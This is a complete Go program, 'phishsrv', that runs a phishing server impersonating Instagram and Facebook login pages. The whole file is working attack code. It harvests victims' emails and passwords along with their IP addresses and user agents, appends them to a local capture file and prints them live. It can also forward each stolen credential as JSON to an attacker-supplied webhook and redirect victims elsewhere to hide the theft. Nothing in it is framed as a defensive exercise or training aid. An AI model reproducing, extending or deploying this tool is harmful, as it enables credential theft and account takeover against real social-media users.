package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type Cred struct {
	Time     string `json:"time"`
	Email    string `json:"email"`
	Password string `json:"password"`
	Source   string `json:"source"`
	IP       string `json:"ip"`
	UA       string `json:"ua"`
	Ref      string `json:"ref"`
}

const (
	cReset  = "\033[0m"
	cRed    = "\033[1;31m"
	cGreen  = "\033[1;32m"
	cYellow = "\033[1;33m"
	cCyan   = "\033[1;36m"
	cGray   = "\033[1;30m"
	cBold   = "\033[1m"
	cWhite  = "\033[1;37m"
	cBlue   = "\033[1;34m"
	cMag    = "\033[1;35m"
)

var (
	port     = flag.String("port", "8080", "listen port")
	outFile  = flag.String("out", "captures.jsonl", "append captures here")
	tplPath  = flag.String("tpl", "templates/login.html", "instagram login page template")
	tplFB    = flag.String("tplfb", "templates/fb.html", "facebook login page template")
	redirect = flag.String("redirect", "", "url to send user after capture (optional)")
	webhook  = flag.String("webhook", "", "POST each capture as JSON here (optional)")
	tag      = flag.String("tag", "", "label to tag captures (optional)")
	modeFlg  = flag.String("mode", "", "skip menu: ig | fb | both")
)

func main() {
	flag.Parse()

	// ---- load templates ----
	igTpl, err := os.ReadFile(*tplPath)
	if err != nil {
		log.Fatalf("ig template read: %v", err)
	}
	fbTpl, err := os.ReadFile(*tplFB)
	if err != nil {
		log.Fatalf("fb template read: %v", err)
	}

	// ---- choose mode ----
	mode := strings.ToLower(strings.TrimSpace(*modeFlg))
	switch mode {
	case "ig", "instagram":
		mode = "ig"
	case "fb", "facebook":
		mode = "fb"
	case "both", "":
		if mode == "" {
			mode = promptMode()
		} else {
			mode = "both"
		}
	default:
		log.Fatalf("invalid -mode %q (use: ig | fb | both)", *modeFlg)
	}

	// ---- routes ----
	mux := http.NewServeMux()

	serveHTML := func(body []byte) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			w.Header().Set("Cache-Control", "no-store")
			w.Write(body)
		}
	}

	switch mode {
	case "ig":
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != "/" {
				http.NotFound(w, r)
				return
			}
			serveHTML(igTpl)(w, r)
		})
	case "fb":
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != "/" {
				http.NotFound(w, r)
				return
			}
			serveHTML(fbTpl)(w, r)
		})
	case "both":
		mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != "/" {
				http.NotFound(w, r)
				return
			}
			serveHTML(igTpl)(w, r)
		})
		mux.HandleFunc("/fb", serveHTML(fbTpl))
	}

	mux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Redirect(w, r, "/", http.StatusFound)
			return
		}
		_ = r.ParseForm()

		src := strings.TrimSpace(r.FormValue("source"))
		if src == "" {
			src = "unknown"
		}

		c := Cred{
			Time:     time.Now().UTC().Format(time.RFC3339),
			Email:    strings.TrimSpace(r.FormValue("email")),
			Password: r.FormValue("password"),
			Source:   src,
			IP:       clientIP(r),
			UA:       r.UserAgent(),
			Ref:      *tag,
		}

		saveLocal(c)
		printLive(c)

		if *webhook != "" {
			go pushWebhook(c)
		}

		if *redirect != "" {
			http.Redirect(w, r, *redirect, http.StatusFound)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		io.WriteString(w, `<!doctype html><html><body style="font-family:system-ui;background:#0f1115;color:#e6e6e6;display:grid;place-items:center;height:100vh;margin:0"><h2>Verifying…</h2></body></html>`)
	})

	// ---- banner ----
	fmt.Println()
	fmt.Printf("%s╔══════════════════════════════════════════════╗%s\n", cCyan, cReset)
	fmt.Printf("%s║%s  %sphishsrv%s  —  ready                          %s║%s\n", cCyan, cReset, cBold+cGreen, cReset, cCyan, cReset)
	fmt.Printf("%s╚══════════════════════════════════════════════╝%s\n", cCyan, cReset)
	fmt.Printf("  %smode%s     : %s%s%s\n", cGray, cReset, cBold, modeLabel(mode), cReset)
	fmt.Printf("  %slisten%s   : %shttp://0.0.0.0:%s%s\n", cGray, cReset, cCyan, *port, cReset)
	if mode == "both" {
		fmt.Printf("  %sIG%s       : /%s\n", cGray, cReset, cReset)
		fmt.Printf("  %sFB%s       : /fb%s\n", cGray, cReset, cReset)
	} else if mode == "ig" {
		fmt.Printf("  %sIG%s       : /%s\n", cGray, cReset, cReset)
	} else {
		fmt.Printf("  %sFB%s       : /%s\n", cGray, cReset, cReset)
	}
	fmt.Printf("  %sout%s      : %s%s%s\n", cGray, cReset, cYellow, *outFile, cReset)
	if *webhook != "" {
		fmt.Printf("  %swebhook%s  : %s%s%s\n", cGray, cReset, cMag, *webhook, cReset)
	}
	if *tag != "" {
		fmt.Printf("  %stag%s      : %s\n", cGray, cReset, *tag)
	}
	fmt.Println()

	addr := ":" + *port
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Fatalf("server: %v", err)
	}
}

// promptMode shows an interactive menu on the terminal.
func promptMode() string {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println()
	fmt.Printf("%s╔══════════════════════════════════════════════╗%s\n", cCyan, cReset)
	fmt.Printf("%s║%s  %sphishsrv%s  —  choose a page               %s║%s\n", cCyan, cReset, cBold+cGreen, cReset, cCyan, cReset)
	fmt.Printf("%s╚══════════════════════════════════════════════╝%s\n", cCyan, cReset)
	fmt.Println()
	fmt.Printf("  %s[1]%s  %sInstagram%s   %s(dark login)%s\n", cYellow, cReset, cBold, cReset, cGray, cReset)
	fmt.Printf("  %s[2]%s  %sFacebook%s    %s(light login)%s\n", cYellow, cReset, cBold, cReset, cGray, cReset)
	fmt.Printf("  %s[3]%s  %sBoth%s        %s(IG on /, FB on /fb)%s\n", cYellow, cReset, cBold, cReset, cGray, cReset)
	fmt.Println()
	fmt.Printf("  %s>%s choose %s[1/2/3]%s: ", cGreen, cReset, cGray, cReset)

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			log.Fatalf("input: %v", err)
		}
		choice := strings.TrimSpace(line)
		switch choice {
		case "1":
			return "ig"
		case "2":
			return "fb"
		case "3":
			return "both"
		default:
			fmt.Printf("  %sinvalid%s — enter 1, 2 or 3: ", cRed, cReset)
		}
	}
}

func modeLabel(m string) string {
	switch m {
	case "ig":
		return "Instagram only"
	case "fb":
		return "Facebook only"
	case "both":
		return "Instagram + Facebook"
	}
	return m
}

func saveLocal(c Cred) {
	f, err := os.OpenFile(*outFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		log.Printf("%ssave error: %v%s", cRed, err, cReset)
		return
	}
	defer f.Close()
	b, _ := json.Marshal(c)
	f.Write(append(b, '\n'))
}

func printLive(c Cred) {
	bar := strings.Repeat("─", 46)
	srcColor := cYellow
	if c.Source == "facebook" {
		srcColor = cBlue
	} else if c.Source == "instagram" {
		srcColor = cMag
	}
	fmt.Printf("\n%s%s%s\n", cGray, bar, cReset)
	fmt.Printf("%s[+] CAPTURE %s%s  src=%s%s%s  %s\n",
		cGreen, c.Time, cReset, srcColor, c.Source, cReset, cGray+c.IP+cReset)
	fmt.Printf("    email    : %s%s%s\n", cYellow, c.Email, cReset)
	fmt.Printf("    password : %s%s%s\n", cRed, c.Password, cReset)
	if c.UA != "" {
		fmt.Printf("    ua       : %s%s%s\n", cGray, truncate(c.UA, 70), cReset)
	}
	if c.Ref != "" {
		fmt.Printf("    tag      : %s\n", c.Ref)
	}
	fmt.Printf("%s%s%s\n", cGray, bar, cReset)
}

func pushWebhook(c Cred) {
	b, _ := json.Marshal(c)
	req, err := http.NewRequest("POST", *webhook, bytes.NewReader(b))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Phish-Tag", *tag)
	req.Header.Set("X-Phish-Source", c.Source)
	client := &http.Client{Timeout: 6 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("%swebhook fail: %v%s", cRed, err, cReset)
		return
	}
	resp.Body.Close()
}

func clientIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		return strings.TrimSpace(strings.Split(xff, ",")[0])
	}
	if xr := r.Header.Get("X-Real-IP"); xr != "" {
		return xr
	}
	host := r.RemoteAddr
	if i := strings.LastIndex(host, ":"); i > 0 {
		host = host[:i]
	}
	return host
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func init() {
	if d := filepath.Dir(*tplPath); d != "" && d != "." {
		_ = os.MkdirAll(d, 0755)
	}
}
